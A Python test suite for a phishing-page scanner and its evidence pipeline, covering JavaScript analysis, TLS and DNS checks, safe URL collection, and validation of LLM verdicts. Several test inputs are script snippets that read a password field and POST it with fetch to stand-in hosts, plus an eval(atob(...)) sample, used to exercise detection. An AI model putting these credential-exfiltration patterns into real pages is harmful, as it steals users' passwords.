"""실패 원인·반대 사례·연결 경계에 대한 회귀 검증. 외부망 접근 없음."""
from concurrent.futures import ThreadPoolExecutor
from copy import deepcopy
from pathlib import Path
import json
from unittest.mock import patch
import httpx
import pytest
from L3_SCANNER import L3Scanner
from L3_SCANNER.policies.operational import operational_detection_policy
from L3_SCANNER.policies.runtime import RuntimeConfig
from evidence_pipeline import build_record, FastPipeline
from evidence_pipeline.context_relations import build_internal_context as build_context
from evidence_pipeline.records import digest
from evidence_pipeline.pipeline import validate_judgment
from url_collector import collect_url, CollectionPolicy

POLICY=operational_detection_policy()
def scan(html):return L3Scanner(POLICY).scan_content({'original_url':'https://example.com/','html':{'content':html}})
def js(code):return scan('<input id="password" type="password"><script>'+code+'</script>')
def signal(r,n):return next(s for s in r['signals'] if s['id']==n)
def record_context(html='<h1>Account</h1>'):
    result=scan(html);raw=result['raw'];r=build_record('l3',result,request_id='test-malicious-123',attempt='1',source_reference='test-malicious-123',raw=raw)
    return r,raw,build_context([r],{'l3':raw})

@pytest.mark.parametrize('code',[
    "var obj={fetch:function(x){return x;}};obj.fetch('https://evil.example.net/');",
    "var fetch=function(x){return x;};fetch('https://evil.example.net/');",
    "var x={open:function(){},send:function(){}};x.open('POST','https://evil.example.net/');x.send('a');",
])
def test_unrelated_names_are_not_browser_network_calls(code):
    assert not js(code)['raw']['javascript']['network_requests']

def test_fetch_alias_retains_sink():
    r=js("var send=window.fetch;var p=document.getElementById('password').value;send('https://elsewhere.example.net/',{method:'POST',body:p});")
    assert signal(r,'L3-J-06')['detected'] is True

def test_fragment_credential_not_http_payload():
    r=js("var p=document.getElementById('password').value;fetch('https://elsewhere.example.net/#'+p);")
    assert not r['raw']['javascript']['network_requests'][0]['source_links']

def test_query_and_name_selector_are_separate():
    r=scan('<input id="id" name="password" type="password"><script>var p=document.getElementById("password").value;fetch("https://other.net/",{body:p});</script>')
    assert not r['raw']['javascript']['credential_access']

def test_data_blocks_do_not_count_as_parser_failure():
    r=scan('<script type="application/ld+json">{"name":"normal"}</script>')
    assert all(s['status']=='not_applicable' for s in r['signals'] if s['id'].startswith('L3-J'))
    assert not r['errors']

def test_two_roots_do_not_collapse_into_one_reason():
    r,raw,_=record_context()
    result=scan('<script>var x=data?.value;</script>')
    result['errors'].append({'code':'request_timeout','stage':'script_collection','details':{'url':'https://cdn.example/x.js'}})
    record=build_record('l3',result,request_id='r',attempt='1')
    kinds={c['kind'] for c in record['causes']}
    assert {'parse_unsupported_or_invalid','collection_timeout'} <= kinds
    assert len({c['id'] for c in record['causes']})==len(record['causes'])

def test_context_blinds_evaluation_identity():
    _,_,context=record_context()
    assert 'test-malicious' not in json.dumps(context)

def test_context_rejects_mismatched_raw():
    record,raw,_=record_context()
    raw['html']['document']['title']='changed'
    with pytest.raises(ValueError,match='hash mismatch'):build_context([record],{'l3':raw})

def test_context_rejects_mixed_attempts():
    record,raw,_=record_context()
    other=deepcopy(record);other['attempt']='2';other['layer']='l2'
    with pytest.raises(ValueError,match='Mixed'):build_context([record,other],{'l3':raw,'l2':raw})

def test_context_preserves_payment_button_without_verdict():
    _,_,context=record_context('<form><input id="p" type="password"><button formaction="https://pay.example.net/" formmethod="post">Pay</button></form>')
    button=context['documents'][0]['buttons'][0]
    assert button['text']=='Pay' and button['effective_action_url']=='https://pay.example.net/'
    assert 'verdict' not in context

def test_context_preserves_provider_warning_text():
    _,_,context=record_context('<h1>Warning: Suspected Phishing Site</h1><p>This site may trick you into sharing personal information.</p>')
    assert 'Suspected Phishing' in context['documents'][0]['text']

def test_context_keeps_linked_source_in_behavior_bundle():
    r=js("var p=document.getElementById('password').value;fetch('https://other.net/',{method:'POST',body:p});")
    record=build_record('l3',r,request_id='r',attempt='1')
    context=build_context([record],{'l3':r['raw']})
    b=context['behaviors'][0]
    assert b['linked_sources'][0]['event_id']==b['observation']['source_links'][0]['source_event_id']

def test_context_budget_is_explicit():
    record,raw,_=record_context()
    with pytest.raises(ValueError,match='context_budget_exceeded'):build_context([record],{'l3':raw},max_bytes=20)

def test_invalid_judgment_reference_is_service_validation_failure():
    _,_,context=record_context()
    value={'verdict':'MALICIOUS','summary':'x','reasons':[{'text':'x','evidence_ids':['invented']}],'limitations':[],'deep_analysis_needed':False}
    with pytest.raises(ValueError,match='invalid_evidence'):validate_judgment(value,context)

def test_valid_rdap_not_found_remains_negative():
    from src.infra import rdap
    response=httpx.Response(404,json={'errorCode':404,'title':'Not Found'},request=httpx.Request('GET','https://rdap.example/domain/test.com'))
    with patch.object(rdap._CLIENT,'get',return_value=response):
        record,raw=rdap.query_rdap('test.com')
    assert record.result=={'registered':False} and raw

def test_private_tls_blocked_before_socket():
    from l2_scanner.collectors import certificate_collector as c
    with patch.object(c.socket,'create_connection') as connection:
        result=c.collect('127.0.0.1')
    connection.assert_not_called()
    assert result['leaf_certificate'] is None and result['errors']

def test_shared_private_initial_target_has_specific_cause():
    with patch('httpx.Client') as client:
        s=collect_url('http://127.0.0.1/',CollectionPolicy(5,5,1000,'test'))
    client.assert_not_called()
    assert s.collection_errors[0].code=='target_policy_blocked'

def test_cookie_does_not_cross_unrelated_host():
    def handler(request):
        if request.url.host=='first.example.com':return httpx.Response(302,headers={'set-cookie':'s=secret; Secure; Path=/','location':'https://other.example.net/'})
        assert request.headers.get('cookie') is None
        return httpx.Response(200,text='normal')
    s=collect_url('https://first.example.com/',CollectionPolicy(5,5,1000,'test'),resolver=lambda h,p:['93.184.216.34'],transport=httpx.MockTransport(handler))
    assert s.body==b'normal'

def test_local_storage_concurrent_writers_never_overwrite(tmp_path):
    from l2_scanner.storage import _write_atomic_no_overwrite
    target=tmp_path/'evidence.json'
    def run(value):
        try:_write_atomic_no_overwrite(target,value);return True
        except FileExistsError:return False
    with ThreadPoolExecutor(max_workers=2) as pool:results=list(pool.map(run,[b'A'*5000,b'B'*5000]))
    assert sum(results)==1 and target.read_bytes() in [b'A'*5000,b'B'*5000]

def test_full_pipeline_on_single_mocked_http_snapshot(tmp_path):
    from unified_scanner import UnifiedScanner
    from evidence_pipeline.context_inventory import restore
    def collector(url,policy):return collect_url(url,policy,resolver=lambda h,p:['93.184.216.34'],transport=httpx.MockTransport(lambda r:httpx.Response(200,headers={'content-type':'text/html'},text='<h1>Example home</h1>')))
    scanner=UnifiedScanner(collector=collector,l2_runner=lambda s:{'layer':'L2','scan':{'status':'completed'},'raw':{'http':{'final_response':{'url':s.final_url,'status_code':s.status_code,'response_body':{'body_complete':True}}}},'signals':[],'errors':[]})
    def judgment(system,user):
        document_id=next(e['id'] for e in restore(json.loads(user))['evidence'] if e['kind']=='page')
        return {'verdict':'LIKELY_BENIGN','summary':'합성 정상 화면','observations':[{'text':'홈 화면','evidence_ids':[document_id]}],'reasons':[{'text':'홈 화면을 관측함','evidence_ids':[document_id]}],'limitations':['합성 테스트'],'deep_analysis_needed':False}
    p=FastPipeline(collector=scanner,l1_runner=lambda u:({'인프라결과_목록':[]},{}),judgment=judgment)
    result=p.run('https://example.com/',output_root=tmp_path,request_id='r')
    assert result['judgment_status']=='completed'
    assert 'title' in next(e['facts'] for e in restore(result['context'])['evidence'] if e['kind']=='page')['not_recorded']
    assert (tmp_path/'r/1/COMPLETE.json').is_file()
    for record in result['records']:
        assert (tmp_path/'r/1'/record['raw_ref']['key']).is_file()


def test_same_failure_code_different_query_targets_stays_distinct():
    r={'인프라결과_목록':[{'name':name,'status':'도구 오류','reason':'REFUSED','detail':{}} for name in ['DNS A','DNS NS']]}
    record=build_record('l1',r,request_id='r',attempt='1')
    assert len(record['causes'])==2
    assert record['signals'][0]['cause_ids']!=record['signals'][1]['cause_ids']


def test_declared_callback_body_is_not_silently_skipped():
    r=js("function submit(){fetch('https://other.net/', {method:'POST',body:document.getElementById('password').value});} button.addEventListener('click',submit);")
    assert signal(r,'L3-J-06')['detected'] is True
    assert r['raw']['javascript']['network_requests'][0]['execution_observed'] is False


def test_cross_script_function_keeps_definition_provenance():
    r=scan("<script>function send(u){fetch(u);}</script><script>send('https://other.net/');</script>")
    events=r['raw']['javascript']['network_requests']
    resolved=[e for e in events if e['destination_url']=='https://other.net/']
    assert len(resolved)==1 and resolved[0]['script_id']=='script-1'
    assert resolved[0]['source_excerpt']=='fetch(u)'
    assert 'script-2' in resolved[0]['call_context'][-1]


def test_selector_limit_does_not_hide_unrelated_absence():
    r=js("document.querySelector('form input:last-child').value;")
    assert signal(r,'L3-J-05')['detected'] is None
    assert signal(r,'L3-J-08')['detected'] is False


def test_typed_san_presence_and_ip_names_are_not_conflated():
    from l2_scanner.analyzers.certificate.hostname_match import analyze
    def check(host,**leaf):return analyze({'hostname':host,'leaf_certificate':{'subject':'CN=example.com','san':[],**leaf}})
    assert check('example.com',san_present=True,san_dns=[],san_ip=[])['detected'] is True
    assert check('203.0.113.1',san_present=True,san_dns=['203.0.113.1'],san_ip=[])['detected'] is True
    assert check('2001:db8::1',san_present=True,san_dns=[],san_ip=['2001:0db8:0:0:0:0:0:1'])['detected'] is False


def test_context_failure_preserves_raw_and_does_not_judge(tmp_path):
    from unittest.mock import Mock
    collector=Mock();collector.scan_url.return_value={'layers':{'l3':scan('<h1>body</h1>')}}
    judge=Mock()
    p=FastPipeline(collector=collector,l1_runner=lambda u:({},{}),judgment=judge)
    with patch('evidence_pipeline.pipeline.build_context',side_effect=ValueError('context_budget_exceeded')):
        result=p.run('https://example.com/',output_root=tmp_path,request_id='r')
    assert result['judgment_status']=='not_attempted_context_failure'
    judge.assert_not_called()
    assert json.loads((tmp_path/'r/1/raw-l3.json').read_text(encoding='utf-8'))['html']['source']
    assert (tmp_path/'r/1/COMPLETE.json').exists()


def test_gateway_retains_quota_cause_and_redacts_key():
    import io,urllib.error
    from evidence_pipeline.gateway import AnthropicGateway,JudgmentServiceError
    body=json.dumps({'error':{'type':'insufficient_credits','code':'key_quota_exceeded','message':'quota exceeded for test-secret'}}).encode()
    def opener(*args,**kwargs):raise urllib.error.HTTPError('https://gateway.example/v1/messages',402,'Payment Required',{},io.BytesIO(body))
    gateway=AnthropicGateway('https://gateway.example','test-secret','test-model',opener=opener)
    with pytest.raises(JudgmentServiceError) as info:gateway('system','user')
    assert info.value.detail['kind']=='quota_exceeded'
    assert info.value.detail['provider_code']=='key_quota_exceeded'
    assert 'test-secret' not in json.dumps(info.value.detail)


def test_pipeline_does_not_convert_quota_failure_to_unknown(tmp_path):
    from unittest.mock import Mock
    from evidence_pipeline.gateway import JudgmentServiceError
    collector=Mock();collector.scan_url.return_value={'layers':{'l3':scan('<h1>body</h1>')}}
    p=FastPipeline(collector=collector,l1_runner=lambda u:({},{}),judgment=Mock(side_effect=JudgmentServiceError('quota_exceeded')))
    result=p.run('https://example.com/',output_root=tmp_path,request_id='r')
    assert result['judgment_status']=='service_failed'
    assert result['judgment_error']['kind']=='quota_exceeded'
    assert 'judgment' not in result


def test_l2_preserves_captured_bytes_for_later_decoding():
    import base64
    from l2_scanner.adapters.page_snapshot import to_l2_http_raw
    body='<meta charset="euc-kr">결제'.encode('cp949')
    snapshot=collect_url('https://example.com/',CollectionPolicy(5,5,1000,'test'),resolver=lambda h,p:['93.184.216.34'],transport=httpx.MockTransport(lambda r:httpx.Response(200,content=body)))
    raw=to_l2_http_raw(snapshot)
    assert base64.b64decode(raw['response_body']['captured_bytes_base64'])==body


def test_l1_asn_starts_after_addresses_without_waiting_for_ns():
    from threading import Event
    import time
    from src import handler
    from src.common import InfraRecord
    from src.domain_units import compute_domain_units
    from src.failure import Probes
    asn_started=Event();ns_waited=[]
    def dns_query(host,kind):
        if kind=='NS':ns_waited.append(asn_started.wait(timeout=2))
        return InfraRecord('DNS '+kind,'응답 수신',{'records':['93.184.216.34'] if kind=='A' else []}),{}
    def asn_query(ips):
        assert ips==('93.184.216.34',)
        asn_started.set()
        return InfraRecord('IP·ASN','응답 수신',{}),{}
    with patch.object(handler,'query_dns',side_effect=dns_query),patch.object(handler,'query_ip_asn',side_effect=asn_query),patch.object(handler,'query_rdap',return_value=(InfraRecord('RDAP','응답 수신',{}),{})):
        records,raw,failure=handler._query_infra('example.com',compute_domain_units('example.com'),Probes(),time.monotonic()+4)
    assert ns_waited==[True] and failure is None and len(records)==5


def test_l1_failed_query_does_not_discard_other_results():
    import time
    from src import handler
    from src.common import InfraRecord
    from src.domain_units import compute_domain_units
    from src.failure import Probes
    def dns_query(host,kind):
        if kind=='NS':raise RuntimeError('synthetic unexpected failure')
        return InfraRecord('DNS '+kind,'응답 수신',{'records':[]}),{}
    with patch.object(handler,'query_dns',side_effect=dns_query),patch.object(handler,'query_ip_asn',return_value=(InfraRecord('IP·ASN','Not Queried'),{})),patch.object(handler,'query_rdap',return_value=(InfraRecord('RDAP','응답 수신',{}),{})):
        records,_,failure=handler._query_infra('example.com',compute_domain_units('example.com'),Probes(),time.monotonic()+4)
    assert len(records)==5 and failure is None
    assert next(r for r in records if r.name=='DNS NS').detail['code']=='collector_exception'


def test_l1_budget_failure_is_not_completed_record():
    result={'전체상태':'실패','실패사유':'관측 무효(예산 초과)','인프라결과_목록':[{'name':'DNS A','status':'응답 수신','result':{'records':[]}}]}
    record=build_record('l1',result,request_id='r',attempt='1')
    assert record['execution']['state']=='interrupted'
    assert record['acquisition']['state']=='partial'
    assert record['analysis']['state']=='completed'  # The returned DNS result was analyzed; other queries did not finish.
    assert any(c['code']=='infrastructure_budget_exceeded' for c in record['causes'])


def test_asn_refused_is_not_relabelled_servfail_or_organization():
    import dns.message,dns.rcode,dns.resolver
    from src.infra import ip_asn
    query=dns.message.make_query('x.example','TXT');response=dns.message.make_response(query);response.set_rcode(dns.rcode.REFUSED)
    exc=dns.resolver.NoNameservers(request=query,errors=[('1.1.1.1',False,53,'REFUSED',response)])
    with patch.object(ip_asn._RESOLVER,'resolve',side_effect=exc):
        value,lines,raw=ip_asn._query_origin('93.184.216.34')
    assert value=={'lookup_failure':{'response_codes':['REFUSED']}} and raw
    with patch.object(ip_asn,'_query_origin',return_value=({'asn':'123','prefix':'93.184.216.0/24','country':'US'},[],{})),patch.object(ip_asn,'_query_org',return_value=(value,{})):
        record,_=ip_asn.query_ip_asn(('93.184.216.34',))
    assert 'org' not in record.result['93.184.216.34'] and 'REFUSED' in str(record.detail)


def test_context_links_decode_source_to_dynamic_execution():
    r=js("eval(atob('YWxlcnQoMSk='));")
    record=build_record('l3',r,request_id='r',attempt='1')
    context=build_context([record],{'l3':r['raw']})
    behavior=next(b for b in context['behaviors'] if b['kind']=='dynamic_execution')
    assert behavior['linked_sources'][0]['method']=='atob'


def test_unmodeled_function_return_is_not_negative_exfiltration():
    r=js("function read(){return document.getElementById('password').value;} fetch('https://other.net/',{body:read()});")
    assert signal(r,'L3-J-06')['detected'] is None
    assert any(e['code']=='function_return_value_unresolved' and e.get('source_excerpt') for e in r['raw']['javascript']['errors'])


def test_external_javascript_decoding_loss_retains_original_bytes():
    import base64
    from L3_SCANNER.collectors.javascript_collector import collect_external_script
    from L3_SCANNER.models.input import ScriptInput
    body=b'var name="\xff";'
    script=collect_external_script(ScriptInput('s','external',source_url='https://example.com/a.js'),RuntimeConfig(fetch_external_scripts=True),resolver=lambda h,p:['93.184.216.34'],transport=httpx.MockTransport(lambda r:httpx.Response(200,headers={'content-type':'application/javascript; charset=utf-8'},content=body)))
    assert any(e['code']=='decoding_loss' for e in script.collection_errors)
    assert base64.b64decode(script.response['captured_bytes_base64'])==body
    r=L3Scanner(POLICY).scan_content({'original_url':'https://example.com/','html':{'content':'<h1>Page</h1>'},'scripts':[{'script_id':'s','type':'external','source':script.source,'collection_errors':script.collection_errors}]})
    assert r['raw']['javascript']['analysis']['decoding_complete'] is False
    assert signal(r,'L3-J-06')['detected'] is None


def test_external_script_http_error_body_is_not_page_script_behavior():
    from L3_SCANNER.collectors.javascript_collector import collect_external_script
    from L3_SCANNER.models.input import ScriptInput
    script=collect_external_script(ScriptInput('s','external',source_url='https://example.com/a.js'),RuntimeConfig(fetch_external_scripts=True),resolver=lambda h,p:['93.184.216.34'],transport=httpx.MockTransport(lambda r:httpx.Response(404,headers={'content-type':'application/javascript'},text="fetch('https://other.net/');")))
    assert script.source is None and script.response['status_code']==404
    assert script.response['captured_bytes_base64']


def test_pipeline_preserves_nested_layer_exception(tmp_path):
    from unittest.mock import Mock
    collector=Mock();collector.scan_url.return_value={'layers':{'l2':None,'l3':scan('<h1>Page</h1>')},'errors':[{'layer':'L2','error_type':'ValueError','message':'synthetic analyzer failure'}],'raw_snapshot':{'captured_bytes_base64':'UGFnZQ=='}}
    result=FastPipeline(collector=collector,l1_runner=lambda u:({},{})).run('https://example.com/',output_root=tmp_path,request_id='r')
    l2=next(r for r in result['records'] if r['layer']=='l2')
    assert any(c['code']=='layer_execution_failed' and c['detail']['error_type']=='ValueError' for c in l2['causes'])
    assert (tmp_path/'r/1/raw-http-snapshot.json').is_file()


def test_judgment_reference_catalog_accepts_provided_scripts_but_rejects_invented_ids():
    _,_,context=record_context('<h1>Game</h1><script>var x=1;</script>')
    provided=context['script_coverage'][0]['script_id']
    judgment={'verdict':'UNKNOWN','summary':'관측 범위가 제한됨','observations':[{'text':'게임 안내 문구','evidence_ids':[context['documents'][0]['id']]}],
              'reasons':[{'text':'정적 소스의 범위','evidence_ids':[provided]}],'limitations':['실행 미관찰'],'deep_analysis_needed':True}
    assert validate_judgment(judgment,context,require_observations=True)==judgment
    judgment['reasons'][0]['evidence_ids']=['nonexistent-script']
    with pytest.raises(ValueError,match='invalid_evidence_reference'):
        validate_judgment(judgment,context,require_observations=True)


def test_judgment_requires_separate_observations_in_current_pipeline():
    _,_,context=record_context()
    judgment={'verdict':'UNKNOWN','summary':'확인 부족','reasons':[{'text':'본문의 확인 범위','evidence_ids':[context['documents'][0]['id']]}],'limitations':[],'deep_analysis_needed':True}
    validate_judgment(judgment,context)  # Historical contract stays inspectable.
    with pytest.raises(ValueError,match='invalid_observations'):
        validate_judgment(judgment,context,require_observations=True)


@pytest.mark.parametrize('matched',[True,False,None])
def test_context_separates_subject_name_from_hostname_comparison(matched):
    raw={'tls':{'hostname':'shop.example.com','leaf_certificate':{'subject':'CN=other.example.com','san':['shop.example.com']}}}
    result={'signals':[{'id':'L2-C-03','name':'hostname_mismatch','detected':None if matched is None else not matched,'evidence':{'matched':matched,'matched_name':'shop.example.com' if matched else None}}]}
    record=build_record('l2',result,request_id='r',attempt='1',raw=raw)
    fact=build_context([record],{'l2':raw})['technical_facts'][0]
    assert fact['hostname_match'] is matched
    assert fact['subject_distinguished_name']=='CN=other.example.com'
    assert 'does not override' in fact['scope']


def test_context_retains_nonexecuted_page_context():
    _,_,context=record_context('<h1>Game</h1><iframe src="/payment"></iframe><button onclick="pay()">Pay</button><img src="logo.png" alt="Example"><meta property="og:title" content="Game">')
    doc=context['documents'][0]
    assert doc['frames'] and doc['inline_handlers'] and doc['declared_metadata']
    assert doc['image_texts'][0]['alt']=='Example'


def test_ip_host_asn_exception_retains_not_applicable_dns_records():
    import time
    from src import handler
    from src.domain_units import compute_domain_units
    from src.failure import Probes
    with patch.object(handler,'query_ip_asn',side_effect=ValueError('synthetic provider failure')):
        records,_,failure=handler._query_infra('93.184.216.34',compute_domain_units('93.184.216.34'),Probes(),time.monotonic()+2)
    assert len(records)==5 and failure is None
    assert records[-2].detail['code']=='collector_exception'


def test_openai_gateway_preserves_usage_and_rejects_truncated_response():
    import io
    from evidence_pipeline.gateway import OpenAICompatibleGateway,JudgmentServiceError
    requests=[]
    envelope={'choices':[{'finish_reason':'stop','message':{'content':'{"verdict":"UNKNOWN"}'}}],'usage':{'prompt_tokens':100,'completion_tokens':10}}
    def opener(request,**kwargs):
        requests.append(json.loads(request.data))
        return io.BytesIO(json.dumps(envelope).encode())
    gateway=OpenAICompatibleGateway('http://127.0.0.1:8000','synthetic-key','test-model',opener=opener,disable_thinking=True)
    assert gateway('system','input')=={'verdict':'UNKNOWN'}
    assert gateway.last_response['usage']['prompt_tokens']==100
    assert requests[0]['chat_template_kwargs']['enable_thinking'] is False
    envelope['choices'][0]['finish_reason']='length'
    with pytest.raises(JudgmentServiceError,match='response_incomplete'):gateway('system','input')
    with pytest.raises(ValueError):OpenAICompatibleGateway('http://external.example','synthetic-key','test-model')


def test_pipeline_keeps_invalid_llm_output_for_diagnosis(tmp_path):
    from unittest.mock import Mock
    value={'verdict':'UNKNOWN','summary':'결론','observations':[],'reasons':[{'text':'잘못된 참조','evidence_ids':['invented']}],'limitations':[],'deep_analysis_needed':True}
    collector=Mock();collector.scan_url.return_value={'layers':{'l3':scan('<h1>Page</h1>')}}
    result=FastPipeline(collector=collector,l1_runner=lambda u:({},{}),judgment=lambda s,u:value).run('https://example.com/',output_root=tmp_path,request_id='r')
    assert result['judgment_status']=='output_validation_failed'
    assert 'judgment' not in result and result['judgment_unvalidated']==value
